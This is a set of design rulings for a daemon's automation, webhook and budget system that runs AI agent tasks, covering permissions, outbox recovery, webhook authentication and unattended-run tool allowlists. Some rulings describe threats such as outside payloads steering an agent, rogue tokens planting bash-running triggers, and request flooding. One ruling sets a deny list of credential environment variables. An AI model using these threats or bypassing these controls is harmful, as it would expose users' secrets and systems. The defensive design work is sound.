# M10 rulings (outbox, automation and FinOps)

Source: `docs/plans/2026-10-14-m10-outbox-automation-finops.md`, copied verbatim as the plan was merged (M10R1 to M10R122 and the red-team additions up to M10R162), then the owner's answers (decision 81), then the controller's rulings made while the plan ran. **Where a ruling below and the code differ, the code wins and the difference is listed under "Plan deviations ruled during execution".** Task numbers in brackets are the plan's.

## Plan rulings

- **M10R1** [1, all] Permission domains `automation`, `usage`, `inbox` are appended to `DOMAINS` after `pi` (M9 appends `lanes` beside them; a union at the merge, agreement 4).
  - `automation.triggers.list|get`, `automation.journal`, `subscribe.tasks` → `automation:read`.
  - `automation.fire`, `automation.dryRun`, `automation.tasks.cancel|retry`, `automation.failures.dismiss` → `automation:operate`.
  - `automation.triggers.create|update|delete|setEnabled|rotateSecret`, `automation.tasks.releaseTools` → `automation:admin`.
  - `usage.summary`, `subscribe.usage` → `usage:read`; `usage.cancelResume|resumeNow` → `usage:operate`.
  - `inbox.list`, `subscribe.inbox` → `inbox:read`; `inbox.markRead` → `inbox:operate`.
  - `models.usage` → `pi:admin` (M7's domain; Task 18).
- **M10R2** [1, 3, 11] `TOKEN_PERMISSIONS` gains one filter term, `permission !== "automation:admin"`. A token can fire, dry-run, cancel and retry (scripts and CI, decision 10), never create, edit, rotate or delete a trigger, never lift a task's tool list (agreement 5: no standing code-running change). `auth.test.ts`'s `toHaveLength(22)` and its copy of the filter are replaced by a derived assertion: a `NEVER_FOR_TOKENS` predicate in the test (`auth:*`, `terminal:*`, `policy:admin`, `pi:admin`, `automation:admin`) and `TOKEN_PERMISSIONS` equal to `ALL_PERMISSIONS` minus it, so M9's `lanes:admin` merges as one more term (agreement 4). Cost if wrong: a token plants a trigger that runs an agent with bash every five minutes.
- **M10R3** [1] Three error codes after M7's `config_hard_link` and before `unknown_method`, with eager en and fr messages in `i18n/catalog/shell.ts`:
  - `automation_paused`: "Automation is paused. Resume it on the Tasks board or in Settings › Automation."
  - `budget_reached`: "Today's automation budget is spent. Raise it in Settings › Automation, or wait for tomorrow."
  - `disk_low`: "The disk is almost full: pap keeps some space free for its database. Free some space, then try again."
- **M10R4** (corrected: RT-03, RT-08, RT-13, RT-24, owner m10a4, m10a5, m10q7) [1] `TriggerInput` (below, binding) is the trust boundary of every trigger write; the store keeps the parsed value as JSON and parses it again at every read (M10R21; the re-parse is stable, tested).
  - Its parts: name, source (schedule / webhook / feed / manual), execution (folder, closed tool list, mode, precheck, the precheck's variable names, retry on interrupt, run limits, per-trigger budget) and the prompt template with four placeholders.
  - `mode` never accepts `full-access` (no sandbox before M11; owner m10q4). Absent, it becomes `supervised` for webhook and feed triggers (outside text can steer edits, owner m10a4) and `auto-accept-edits` for schedule and manual ones, made explicit before the value is stored.
  - `maxRunUsd` absent becomes $1 for webhook and feed triggers (a payload can make a run loop, RT-08) and no cap for the owner's own prompts; an explicit `null` is the owner's "no cap".
  - `tools` is a closed list of 1 to 32 distinct names, by default Pi's read tools.
  - `env` (owner m10q7): up to 16 distinct names of daemon variables the precheck receives (its `keep`, M10R151); exact names only, and never one `isNeverPassedEnvKey` matches (M9's `child-env.ts`: the SSH agent, `GIT_*`, `LD_*`, the model providers' families such as `ANTHROPIC_*` and `AWS_*`, credential-looking names), refused here at the trust boundary; only with a precheck.
  - Webhook auth is `secret` or `hmac`: the combined mode is gone (owner m10a5, RT-03: a key that travels in the header makes the HMAC worthless).
  - The prompt and the precheck refuse format characters (bidi, zero-width); the precheck keeps tabs and new lines. `{{payload}}` and `{{precheck}}` appear at most once each (M10R157); `{{precheck}}` without a precheck command is refused.
- **M10R5** (corrected: RT-04, RT-34) [1, 5a, 8b, 12, 17, 23] `AutomationSettings` (account setting `automation`, compare-and-set like every setting, owner R3-4; browser only, owner m10a1, enforced by the settings service in Task 12):
  - `paused: false`; `slots: 2` (1–8): **this owner's** running tasks at most; all owners' automation together is bounded by the worker reserve (M10R154);
  - `timezone: null` (the server's zone; the editor and Settings › Automation fill the browser's zone at the owner's first save, RT-34, so a VPS on UTC does not reset the day at 02:00 Paris time);
  - `quietHours: null`;
  - `dailyBudgetUsd: 5` (null: no budget; 0 refuses every automatic run; owner m10q5);
  - `autoResume: true` (owner m10q6).
- **M10R6** [1, 8a, 20] `inQuietHours(quiet, timeZone, now)` in `automation.ts`. Pure; the wall-clock minute comes from `Intl.DateTimeFormat(..., { hourCycle: "h23" })` in the zone. `from === to` is no window, and `from > to` crosses midnight (pi-web `quiet-hours.ts` behaviour). M12 uses it for pushes; M10 only shows it. Cost if wrong: none.
- **M10R7** [1] The access-token grid gains `access.tokens.domain.automation|usage|inbox` labels. `riskyPermissions` also returns `automation:operate`, with the warning "This token can start automation runs: they spend money and use the tools each trigger allows." (lazy `catalog/settings-access.ts`, union with M9's lines). Cost if wrong: none.
- **M10R8** [2] The outbox lives in the kernel (`kernel/outbox/`), as spec C §1.1 places it ("kernel: db, outbox, scheduler…"): every module that changes state enqueues inside its own transaction with its own `Db`, so the enqueue cannot sit behind a module's `index.ts`. The table belongs to the kernel migration source (`KERNEL_MIGRATIONS`, no `MIGRATION_SOURCES` change). The brief's "module `outbox`" is the same ownership: M10 owns it. Cost if wrong: one file moves.
- **M10R9** (corrected: RT-06) [2] Kinds and classes are one const table (`REPLAY`) with a deadline per kind (`DEADLINE_MS`) and a zod payload per kind (`EFFECT_PAYLOADS`), each `satisfies` an exhaustive record. A kind without a class, a deadline or a payload does not compile. M10's kinds:
  - `task.start`: process-bound;
  - `run.resume`, `feed.poll`, `attachment.cleanup`: replay-safe.
- **M10R10** (corrected: RT-06) [2] **The worker.**
  - **Concurrency:** at most two effects in flight, never two of the same kind (a slow `feed.poll` never holds a `task.start`, and two `task.start` never race each other); oldest due first among pending rows whose kind has a registered handler and is not busy.
  - **Lease:** `claimEffect` in one `UPDATE … WHERE status='pending' AND next_at <= now`; `lease_until` = the kind's deadline + 30 s, informational only (recovery never trusts it). An effect in flight is never leased twice (an in-memory set) and its lease is never renewed.
  - **Deadline:** the handler gets an `AbortSignal` that aborts at `DEADLINE_MS[kind]` (and at `stop()`): `task.start` 90 s (a worker's `ready` takes up to 30 s, then the prompt), `run.resume` 60 s (M9's `beforePrompt` takes up to 15 s, agreement 26), `feed.poll` 60 s (a 10 s fetch, a 34 s precheck and its queue wait), `attachment.cleanup` 30 s. The handler stops its own bounded work on abort and returns what it decides (usually `retry("deadline")`).
  - **No zombie:** the worker settles a row only with its handler's own result, once the handler's promise settled. A handler that has not returned 15 s after the abort is logged once (`outbox_handler_overdue {kind}`); its row stays leased and its kind busy until it returns. A handler that throws is a `retry` with code `handler_error`.
  - **Results:** `done`; `defer(until)` (not an attempt, never less than 1 s); `retry(code)` (attempt + 1; backoff 5 s × 2^(n−1), at most 10 min; the fifth attempt fails); `fail(code)`.
- **M10R11** (corrected: RT-07, RT-21) [2] **Recovery runs first** (`recoverOutbox`, binding), inside `composeOutbox()`, before any module is built (spec C §6.3, T3 "parked roots"), and **never in read-only mode** (M10R150):
  - leased process-bound effects, and leased replay-safe effects past their sent mark (M10R149), are `retired` (`last_error='crash'`);
  - other leased replay-safe effects go back to `pending`, due now;
  - pending effects never ran and stay as they are;
  - a kind this binary has no handler for stays pending, is listed in `outbox_unknown_kinds {count}` once at boot, and is never run.
- **M10R12** [2] `enqueueEffect` (binding) opens no transaction; it is called inside the caller's (the fire row, the task and the effect commit together, C §6.1). The worker is told after the commit (`outbox.poke()`), never before. A duplicate `dedupKey` writes nothing and answers null: that is the receipt against duplicates of C §6.2. Cost if wrong: an effect for a state that rolled back.
- **M10R13** (corrected: RT-16) [2] Retention (C §3.4): `done` and `retired` rows go 7 days after `settled_at`; `failed` rows stay until their owner dismisses them (`automation.failures.dismiss`, Task 5a), then 7 days. `purgeOutbox` runs in the hourly housekeeping (Task 5b). The failures list of an owner, the 20 newest undismissed of their own and the system's (M10R148), feeds the Tasks board banner (Task 20). Cost if wrong: the table grows by about 200 bytes per effect.
- **M10R14** [2] Payload size: at most 16 KiB of JSON (`CHECK`). The payloads are ids only; a task's prompt stays in `tasks`. Cost if wrong: none.
- **M10R15** (corrected: RT-20, RT-30, agreement 24, controller C3) [2, 12] **Composition.** `apps/daemon/src/compose-m10.ts` (new, Task 2, about 40 lines) is `daemon.ts`'s only M10 entry: `M10_MIGRATION_SOURCES` (the automation and inbox sources from `compose-automation.ts`, the runs source from `compose-runs.ts`), `composeM10Early(core)` and `composeM10(core, early, modules)`, returning `{ outbox, runs, observer, onCall, rpc, mount, start, stop }`. It calls `compose-automation.ts` (lane A only: `composeOutbox`, `composeAutomation`) and `compose-runs.ts` (lane B only, from Task 12: `composeRuns`, `bind`); each lane adds its own lines to `compose-m10.ts`, a join resolves them as unions. `daemon.ts` gets **10 M10 lines in all** (agreement 24: ≤ 14). Task 2 writes eight: the import, `...M10_MIGRATION_SOURCES` in `MIGRATION_SOURCES`, `const core = { db, clock, logger, config, readOnly, hub, env };`, `const m10 = composeM10Early(core)` right after `migrate` and the receipt purge, `const m10Late = composeM10(core, m10, { audit, auth, policy, projects, sessions, settings, wk })` after the modules, the rpc spread, the mount, and one line that starts it after `startServer` and stops it first in `stop()` (`m10Late.start()` / `await m10Late.stop()`, the two halves of one `closers`-style entry). Task 12 adds the sessions dep `runs: m10.observer` and Task 13 the dispatcher's `onCall: m10.onCall`, one line each; nothing else of M10 edits `daemon.ts`. **Stop order (C3):** `m10Late.stop()` first (`outbox.stop()` and `automation.stop()`: no new effect or run starts; in-flight handlers aborted and awaited, at most 20 s, then left to the boot recovery; prechecks killed, fetches aborted); then in parallel `pi.stopAll()`, `sessions.shutdownAll()` (and M9's `lanes.shutdown()`); then `wk.shutdown()`, `killAllWorkerGroups()` and the closers (the OTLP flush, at most 2 s). Each compose file stays under 400 lines: past 350, the handler registrations move to `compose-automation-handlers.ts` (lane A) or `compose-runs-bind.ts` (lane B). Cost if wrong: an effect that starts a run during the stop, or a `daemon.ts` past its budget.
- **M10R16** [3] `modules/automation/` (C §1.4). Tables: `triggers`, `tasks`, `trigger_fires`, `feed_seen` (one migration, binding below). Every statement names the owner; another owner's trigger answers `not_found`. At most 200 triggers per owner: the 201st is `limit_reached`. Cost if wrong: none.
- **M10R17** [3, 7a] A trigger id is `newId()` (a v4 UUID, 122 random bits). The hook path accepts exactly that form in lower case (`HOOK_PATH`, Task 7a). The id is not a secret: it shows in the editor and in a sender's logs, so nothing an outsider can do with it may refuse the real sender (the gate order of Task 7a, RT-01). Cost if wrong: none.
- **M10R18** [3, 7a] A webhook trigger (`secret` or `hmac` mode, owner m10a5) gets a secret at creation, and again when an update turns another source into a webhook.
  - Form: `pwh_` + 32 random bytes in base64url.
  - Shown once, in the answer of `create`, `update` or `rotateSecret`, all three `secretResult: true`: no receipt keeps it, and a replayed `commandId` answers `conflict` (M5R68).
  - Stored only in `$PAP_HOME/secrets/triggers/<id>.key` (0600, folder 0700, atomic replace, binding below). The database keeps `secret_rotated_at`, never the value.
  - Rotation replaces the file at once; the old secret stops working (no grace). A trigger in `hmac` mode signs with this same secret, which then never travels.
  - Deleting the trigger removes the file.
  - A webhook trigger whose file is missing or unreadable refuses every delivery (401). Its view says `state: "no_secret"` and the editor offers Rotate.
- **M10R19** [3] `create`, `update` and `rotateSecret` take the password step-up (`step_up_required`, M7R133: changes that make pap run something later; Q15, settled without a question), through the auth module's `requireStepUp`, as M7's services do. `delete` and `setEnabled` never ask (switches and removals never ask, M7R133). Tokens never reach these methods (M10R2). Cost if wrong: one password prompt per 5 minutes of editing.
- **M10R20** [3, 5a] The folder (`execution.cwd`) follows `sessions.create`'s rule (`resolveSessionCwd`: an existing folder, its real path stored, else `invalid_cwd`). It is checked again at each task start (Task 5a).
  - The trigger is filed under the project of its folder through the projects port (`ensure`, as the sessions module does). `project_id` drives the board's columns (owner m10q2).
  - A folder inside `$PAP_HOME` or Pi's agent folder is `invalid_cwd` (an automation run is never pointed at pap's or Pi's state). That also refuses M9's lane worktrees under `$PAP_HOME/worktrees`: automation never runs in a lane this wave, and `resolveSessionCwd` stays unchanged (agreement 16).
  - A variable name the shared environment withholds never gets past `TriggerInput` (`EnvName`, Task 1, M10R151). Task 10 adds one save check to `create` and `update`: a feed address `feedUrlRefusal` refuses → `bad_request` (M10R158).
- **M10R21** [3] `config` stores the parsed `TriggerInput` as JSON and is parsed again at every read. A row that no longer parses (written by a newer pap, edited by hand) reads as `state: "unreadable"`: it never fires and can be deleted or saved again. Cost if wrong: none.
- **M10R22** [3] `update` is compare-and-set on `revision` (`baseRevision`, `conflict` otherwise), like settings (owner R3-4). Cost if wrong: one lost edit.
- **M10R23** [3] Audit rows (Q8, settled without a question; decision 79's open option on audit rows): `create`, `update`, `delete`, `setEnabled` and `rotateSecret` each append one row through `audit.port.append`:
  - kind `policy`, decision `info`, actor and actor id from the caller;
  - `reason` `automation trigger created|updated|deleted|enabled|disabled|secret rotated`;
  - `detail {triggerId, source, mode, tools: <count>, precheck: <boolean>}`. Never the prompt, the command, the folder or the secret.
- **M10R24** (corrected: RT-25) [3, 21] `TriggerView` (what an `automation:read` caller sees):
  - `id`, `name`, `enabled`, `state` (`ok` | `unreadable` | `no_secret`);
  - `source`, `execution` and `prompt` as stored;
  - `projectId`, `cwd`, `revision`, `createdAt`, `updatedAt`;
  - `webhookUrl` (`${config.publicOrigin}/hooks/<id>`, or null for other sources);
  - `secretRotatedAt`, `nextFireAt`, `lastFireAt`.
- **M10R25** [3] `delete` removes the row; its journal and seen-feed rows cascade; the secret file is removed. Its tasks keep their rows with `trigger_id` set to NULL (the immutability trigger allows exactly that move, as tested). A running task of a deleted trigger runs to its end. A pending `feed.poll` for it finds no trigger and is `done`; its in-memory backoff and rate entries are cleared (Task 7a). Cost if wrong: none.
- **M10R26** [1, 4b] `PolicyRules.toolAllowlist` (Task 1) is null for every session that is not an automation task session, and `unattended` false. Cost if wrong: none.
- **M10R27** (corrected: RT-12) [4a] Stage 02's first two checks (binding `policy/tool-allowlist.ts` below), before the preset check, for every call that reaches pap-policy (codemode's nested calls, each judged by its own name, and tools `tool_search` loads):
  1. the allowlist, by exact name: block reason `tool not in the automation's allowlist`;
  2. while `rules.unattended`: a call whose category is `unknown` (an extension tool without annotations, an extension that took a built-in's name: `classifyTool` gives both `unknown`) blocks, even when listed: reason `tool of unknown kind in an unattended run`.
- **M10R28** [4a] The worker pins the list it was started with.
  - `InitRecord.tools.allowlist?: string[]` (1–32 names, Task 1); an invalid list refuses the init.
  - The worker keeps it beside its preset (the same `WeakMap` as `presetOf`) and judges with `pinAllowlist(rules.toolAllowlist, pinned)`. A late, lost or wrong `policy_update` can narrow it, never lift it (ADR 0028's rule for presets). Lifting it ("Use my normal tools", M10R153) takes a new worker started without it.
- **M10R29** (corrected: RT-28) [1, 4a, 5a] The active tool set at each preset re-apply point (session start, tree change, `before_agent_start`, `turn_start`, after `navigate_tree`) is the allowlisted names among Pi's registered tools. The active set is what the model sees, not the gate; stage 02 is the gate. The preset comes from the daemon's snapshot (`presetOfTools`, Task 1): `read-only` only when **every** listed tool is one of Pi's read tools (`read`, `grep`, `find`, `ls`); with any other name (`bash`, an MCP write tool the owner listed, an extension tool) it is `full`, and the approval matrix asks per the mode instead of MC36 blocking the MCP write. Cost if wrong: the model sees tools it cannot call (wasted turns, never a hole), or a listed MCP tool can never run.
- **M10R30** (corrected: RT-12, RT-37) [4b] `session_policy.tool_allowlist` and `session_policy.unattended` (migration below, binding; the CHECK refuses `unattended = 1` without a list).
  - `policy.port.sessionPolicy()` answers both beside mode and taint.
  - `inherit` (fork, clone) copies the list, never `unattended`: a fork is the owner's, attended, and keeps the list until "Use my normal tools".
  - `policy.port.setTaskPolicy(owner, session, {mode, tools, taintedAt})` writes mode, list, taint and `unattended = 1` in one statement; `endTaskPolicy(owner, session)` sets `unattended = 0`; `clearTaskPolicy(owner, session)` sets the list to NULL (refused by the CHECK while unattended). Each change notifies the policy module's listeners, so a live worker gets the new rules as for a mode change.
  - `policy-link.ts` `compose` spreads `taskRules(row, stored)` (from `automation-port.ts`: the in-memory task policy while no row exists, else the stored list and flag): one line, plus the import.
- **M10R31** [4b] **No window without the policy.** A new session's row is inserted only once its worker is `ready` (R37), but `init` is composed before that.
  - The in-memory `SessionRow` of a task session carries `task: TaskSessionPolicy`; `taskRules` uses it while no `session_policy` row exists (unattended true).
  - `service-launch.ts` inserts the row and calls `setTaskPolicy` in **one** `db.transaction`. If that throws, the worker is stopped and nothing is stored.
  - A crash before the commit leaves no row. The Pi file of that draft, if Pi wrote one, is adopted by the scanner like any outside file: tainted (decision 72), no list, an ordinary owner session. It is named in `automation.md`. A crash after this commit and before the runner's `queued → running` commit leaves a task session with no task: the boot archives it (Task 5a, RT-21).
- **M10R32** (corrected: RT-09, RT-10, RT-15, RT-39, agreements 10, 11) [4b, 5a, 5b, 16, 17] `SessionsAutomationPort` (new file `sessions/automation-port.ts`, exported by `sessions/index.ts`; `SessionsService.create` keeps its signature, agreement 10) is the only way the automation and runs modules reach sessions:
- **M10R33** [4b] `onAttention` is fed by wrapping the hub the shell publisher already writes to (`service.ts`, ≤ 3 lines): after a `{kind: "session"}` shell event, each listener gets `(session.id, session.needsInput)`. No new timer, no polling. Cost if wrong: a missed "to handle" Inbox item (the board still shows the session's state).
- **M10R34** (corrected: RT-19, RT-24, RT-33) [5a, 7a, 7b, 8a, 8b, 9, 10] **One fire path.** `fire(triggerId, revision, input)` (`modules/automation/fire.ts`) is the only writer of tasks. In **one** synchronous transaction, with no `await` between the checks and the writes:
  - it re-reads the trigger by id: gone → `{verdict: "error", detail: "changed"}` and no journal row (it cascaded); another `revision` or a config that no longer parses → journal `error` `changed` (the caller read a row the owner has since saved, disabled or narrowed; RT-19);
  - it runs the gates of M10R57, in their order;
  - it renders the prompt (M10R37); longer than `RENDERED_PROMPT_MAX` → journal `error` `prompt_too_large` (M10R157);
  - it writes the journal row;
  - on `fired`, it writes the task (`queued`, `gated` from the input) and the `task.start` effect (the owner's).
- **M10R35** [5a] **States** (C §6.1 plus `limited`, the quota state of C §6.4); every move is one `UPDATE … WHERE state IN (…)` whose `changes` is checked:
- **M10R36** (corrected: RT-06, RT-09, RT-10, RT-34) [5a] **Admission and start** (`task.start` handler, `admit.ts` and `runner.ts`):
  - **Pick:** among queued tasks **not in the in-memory starting set**, of owners who are not paused and whose `running + starting < slots` (slots are per owner, M10R5): the oldest queued task of the trigger whose `last_start_at` is the oldest (never started first; the tasks of deleted triggers form one group), ties by `created_at`. A noisy trigger cannot starve the others (RT-10). Nothing to pick because of a pause → defer 30 s; because of slots → defer 10 s (not an attempt).
  - The task is added to the starting set, which counts as a slot. The handler checks the folder (`invalid_cwd` → `failed`) and calls `createTaskSession` (its own errors: `capacity`, the worker reserve included → the task stays `queued`, defer 30 s; `disk_low` → `failed disk_low`, Task 16; any other → `failed` with the code). Task 8b adds the budget check at start before it.
  - On success, one transaction: `queued → running`, `session_id`, `started_at`, the trigger's `last_start_at`. **It must change exactly one row**: 0 (cancelled meanwhile) → the new session is archived and released, settled `done`.
  - Then `runs.expectOrigin(sessionId, {origin, taskId})` and `prompt`. A disposition other than `started` → `failed prompt_rejected`.
  - **The signal** (90 s, M10R10): aborted before the commit → the new session (if any) archived and released, the task still `queued`, `retry("deadline")`; after the commit the handler finishes its prompt (one call) and settles.
- **M10R37** (corrected: agreement 6) [5a] The prompt is rendered when the task is **fired**, not when it starts. It is stored in `tasks.prompt` with `tainted` and the `policy` snapshot `{mode, tools, preset, env}` (`preset` = `presetOfTools(tools)`), so editing the trigger never changes a fired task. Rendering is `prompt.ts` (binding below): a payload is always fenced, placed at `{{payload}}` or added at the end; `{{precheck}}` fenced; `{{trigger}}` and `{{firedAt}}` plain; one pass, inserted text never read again; fresh 12-hex ids; the fence is contracts' `fenceText` (agreement 6: one format, which pi-host and the web's `splitFences` share), with NUL dropped first. `fenced` → `tainted`. Cost if wrong: outside text reaches the model unfenced, or a run starts untainted.
- **M10R38** [5a, 12, 17] Completion comes from `RunsPort.onRunEnd`, matched by `session_id` (unique on `tasks`):
  - `completed` → `done`; `failed` → `failed` `provider`;
  - `cancelled` → `cancelled` `stopped` (someone pressed Stop in the session), unless the run's `errorClass` is a runner abort (`deadline`, `run_budget`, `budget`: the task already moved, Task 5b);
  - `interrupted` → `interrupted` `crash`;
  - `limited` → `limited`.
- **M10R39** (corrected: RT-08, RT-10, RT-22, owner m10a3, m10q5) [5b] **Limits of a running task:**
  - **Deadline:** a Clock timer of `max_run_ms` from `running` (a resume restarts it). At expiry: `runs.markEnding(session, "deadline")`, `running → failed` `deadline` (terminal), then `abort` through the port; the run's later end is ignored.
  - **Cost cap:** `RunsPort.onLiveCost` after each assistant message (and each compaction, M10R85); past the task's `max_run_usd` → the same with `run_budget`. The cap is per run: a task resumed after a quota reset gets a fresh one, and the daily budget bounds the total (RT-22).
  - **The daily budget across runs:** at each `onLiveCost`, when the owner's `spentToday` (finished runs plus the live cost of open ones, M10R66) reaches `dailyBudgetUsd`, every running task of that owner with `gated = 1` gets `markEnding(… "budget")`, `failed budget` and an abort, and so does every automatic `resume` run of an interactive session (no task; aborted only). A browser's manual fire (`gated = 0`) runs on to its own caps (owner m10q5: counted, not gated).
  - **"Deny on timeout" is a question timeout** (C §5.3, owner m10a3): when a running task's session needs input, a Clock timer of `AUTOMATION_LIMITS.inputWaitMinutes` (10) starts; an answer (attention false) disarms it; at expiry `port.answerUnattended(owner, session)` denies every open approval and cancels other dialogs, an `attention_timeout` event resolves the Inbox item "denied (no answer)" (Task 6), and **the run goes on** (a denied call is a tool result the model reads). A run that keeps asking is bounded by its deadline. A waiting run keeps its slot and its worker.
- **M10R40** (corrected: RT-06, RT-21) [5a] **Cancel** (`automation.tasks.cancel`):
  - `queued` → `cancelled`.
  - `running` or `limited` → `cancelled`, and the session's pending resume cancelled (`outbox.cancel(resume key)`, M10R149), in one transaction; **after the commit** the run is aborted directly through the port (no outbox effect: it would wait behind other handlers while the run spends, RT-06). A crash between the commit and the abort leaves no worker: the boot kills them all.
  - A terminal task → `conflict`.
- **M10R41** (corrected: RT-08) [5a] **Retry** (`automation.tasks.retry`): a `failed`, `interrupted` or `cancelled` task gives a new task (`origin: "retry"`, `retry_of`, the same prompt, taint and policy, a new session) through `fire` (journal source `retry`). Pause applies; the budget gates a token's retry and not a browser session's (`gated` 0 then; its spend still counts, M10R66). Final fix round: a token's retry also needs an enabled trigger (`conflict` otherwise) and runs under the trigger's current tools, mode and env, not the old task's snapshot; the owner's browser retry keeps the snapshot and the M10R57 exemption of a disabled trigger. **`retryOnInterrupt`**: at boot, each task just made `interrupted` whose trigger asks for it and whose `retry_of` is null gets one retry, gated (never a retry of a retry). Cost if wrong: one extra run.
- **M10R42** (corrected: RT-07, RT-21) [5a] **Boot** (`composeAutomation`, before `startServer`, after the outbox and runs recoveries; **not in read-only mode**):
  - `running` → `interrupted` (`crash`);
  - an orphan task session (a `session_policy` row with `unattended = 1` whose session is no task's `session_id`, RT-21) → `endTaskPolicy` and archived;
  - the `retryOnInterrupt` retries;
  - queued tasks with no pending `task.start` get one.
- **M10R43** (corrected: RT-14, RT-31) [5a, 19, 20] **The `tasks` stream** (owner-keyed, like `shell`). Snapshot:
  - `tasks`: every non-terminal task, plus the terminal ones of the last 24 h, newest first, at most 300, `truncated`;
  - `triggers`: id, name, enabled, source type, project id, state, next fire;
  - `paused`, `slots`, `running`, `queued`, `quietHours`;
  - `todayUsd` and `budgetUsd` (Task 12's `spentToday` with the live cost, settings);
  - `failures`: this owner's and the system's 20 newest undismissed failed effects as `{id, kind, lastError, settledAt}`.
- **M10R44** (corrected: RT-07, RT-15, RT-17) [5b] **Housekeeping**, a guarded Clock timer each hour, none in read-only mode:
  - the outbox purge;
  - done task sessions eligible under M10R155 deleted, 100 a pass;
  - terminal tasks older than 30 days deleted (their runs keep the money);
  - the journal cut to the newest 500 rows per trigger, never cutting a `fired` row newer than that trigger's `dedupMinutes` (RT-17: a storm must not reopen a dedup window);
  - Task 6's Inbox retention;
  - one `attachment.cleanup` effect enqueued for today (receipt `attachments:<YYYY-MM-DD>` in the automation time zone; owner NULL; Task 16's handler).
- **M10R45** (corrected: RT-16) [5a] `automation.failures.dismiss {effectId}` (`automation:operate`, mutation) dismisses one failed effect of this owner or the system (`outbox.dismiss(ownerId, id)`, else `not_found`); the banner (Task 20) lists the rest. Cost if wrong: none.
- **M10R46** (corrected: RT-11, owner m10a3) [6] Item kinds in M10, one row per task and kind (unique index):
  - `task_needs_input` (`to_handle`, pink): a running task's session waits for an answer. Resolved when the answer came (`resolved_at`, `resolution: "answered"`) or when nobody answered in 10 minutes (`resolution: "timed_out"`, from Task 5b's `attention_timeout`, shown "denied (no answer)"); then it leaves "To handle". **A new question of the same task reopens the row** (an upsert on `(task_id, kind)`: `resolved_at`, `read_at` and `resolution` cleared, `created_at` now), so the badge counts it again: with `bash` listed, every call asks, and the second question must reach the owner too.
  - `task_done`, `task_failed`, `task_interrupted`, `task_limited` (info): the task's state.
  - A task the owner cancelled gets no item.
  - `title`: the trigger name and the state, e.g. "prod-alerts · done" (fixed i18n text built on the client from `kind`; the row stores the trigger name only). `cost_usd` from runs. The click opens the task's session (`session_id`).
- **M10R47** [6] **The `inbox` stream** (owner-keyed). Snapshot:
  - every unresolved `to_handle` item plus the newest 100 others, newest first;
  - `unread` (unread items), `toHandle` (unresolved `to_handle` items).
- **M10R48** [6] `inbox.markRead {ids?: string[] (≤ 200), all?: true}` (`inbox:operate`, mutation) sets `read_at`; `inbox.list {before?}` pages older items (100). A `to_handle` item stays in "To handle" until resolved, whether read or not. Cost if wrong: none.
- **M10R49** (corrected: RT-36) [6] Retention (in Task 5b's housekeeping): read items whose task is resolved are deleted 30 days after creation. At most 2 000 items per owner. Past the cap, the oldest **read info** items go first; when none can go, a new **info** item is skipped and logged (`inbox_full`, rate-limited), while a `to_handle` item is always written. This eviction is a deliberate exception to "caps refuse, never evict" (as `feed_seen`'s 1 000 cap is): the evicted rows are already read, carry no question, and their tasks and runs keep the history; refusing instead would hide new failures behind old "done" lines. Never evict a waiting question or an unread item. Cost if wrong: a lost "done" line already read.
- **M10R50** (corrected: RT-14) [6] Web: the `inbox` opener, a reducer and an **eager** `inbox-store` holding the counts (and the items, for Task 22 and the approval card's trigger line). The top bar renders the badge from it (`TopBar.tsx`, ≤ 3 lines). The subscription opens in `AppShell`'s one shell effect (`feedInbox`, beside `feedShell`), so the badge is live without the drawer, and the same effect's cleanup stops it and resets the store at sign-out (decision 77, MC34; agreement 21). Cost if wrong: about 0.6 KB eager; or the next account sees the previous owner's badge and items.
- **M10R51** (corrected: RT-01, RT-07) [7a] The route and its order of checks are § "The webhook at a glance". The code below is binding: `hook-auth.ts`, `hook-slots.ts`, the Origin guard's exemption, and one argument in `app.ts`, `originGuard(…, isHookRequest)`.
  - The route never reads a cookie, never authenticates a session, answers JSON with `Cache-Control: no-store`, and never echoes the payload or the secret.
  - Every other unsafe request keeps the Origin check: the exemption is the exact `POST /hooks/<v4 lower-case>` path, as decoded by Hono. Browsers cannot send the secret header cross-origin without a preflight that pap never answers.
  - In read-only mode the route answers `503 read_only` before anything else (M10R150).
- **M10R52** (corrected: RT-03, RT-17, owner m10a5) [7a] Authentication modes (two; the combined mode is gone):
  - `secret`: `Authorization: Bearer <secret>` (the scheme in any case, RFC 7235) or `X-Pap-Secret`; two different secrets refused; an `Authorization` that is not a Bearer (Basic credentials for a proxy in front of pap) is ignored beside `X-Pap-Secret` and, alone, is a wrong secret. Alertmanager's `http_config.authorization` and Grafana's header both fit.
  - `hmac`: the signature only (GitHub, Grafana HMAC without a timestamp header). HMAC-SHA256 over the raw body under the trigger's secret, which then never travels; hex, with or without `sha256=`, in the header the trigger names (`x-pap-signature-256`, `x-hub-signature-256`, `x-grafana-alerting-signature`).
- **M10R53** (corrected: RT-01) [7a] **Failure backoff, for failing requests only:** after 10 refused deliveries (401, 413, 400) within 60 s on one trigger, the next 60 s answer a **failing** request `429 {reason: "backoff"}` with `Retry-After: 60` instead of its 401 / 413 / 400. A request that authenticates is never refused by it: a `secret` delivery whose header passes skips it, and an `hmac` delivery is judged after its body. Unknown ids share one state. The map has one entry per existing trigger (≤ 200 per owner) plus the shared one, cleared on delete, never evicted. Why: an outsider who saw the URL sent 10 bad requests a minute and kept Alertmanager's real deliveries refused. Cost if wrong: alerts delayed or lost.
- **M10R54** (corrected: RT-01) [7a] **Body pools** (`hook-slots.ts`, binding): an `hmac` trigger's read takes a slot of the unauthenticated pool (8 in the daemon, 2 per trigger); a `secret` trigger's read, which starts only after its header passed, takes a slot of the authenticated pool (4, 2 per trigger), which unauthenticated readers cannot reach. Past a cap: `503 capacity`, never queued. 10 s to read a body (`400`), 64 KiB counted as it streams (`413` at 64 KiB + 1; a declared larger `Content-Length` is `413` before reading). Residual (ADR 0042): an outsider who knows four `hmac` hook URLs can hold the unauthenticated pool; `secret` triggers are untouched. Cost if wrong: eight slow bodies answering `503` to every sender.
- **M10R55** (corrected: RT-01, RT-17) [7b] At most 60 **authenticated** deliveries per trigger per minute (a fixed Clock window), counted when authentication passed, whatever the later verdict (dedup refusals included: that also bounds the journal) → `429 {reason: "rate"}` with `Retry-After`. At most 20 queued tasks per trigger → `429 {reason: "queue_full"}` (M10R34's gate). Cost if wrong: an alert storm becomes a bill, or a journal of 600 rows in 10 minutes.
- **M10R56** [7b] **Decoding and mapping** (pi-web `payload-formats.ts` behaviour, rewritten):
  - **Decoding:** a JSON body (`application/json` or `+json`) is parsed (invalid → `400`, journal `bad_payload`); anything else is text (UTF-8, replacement characters).
  - **`raw`:** the text as sent, or the JSON's `text` field when it is a string.
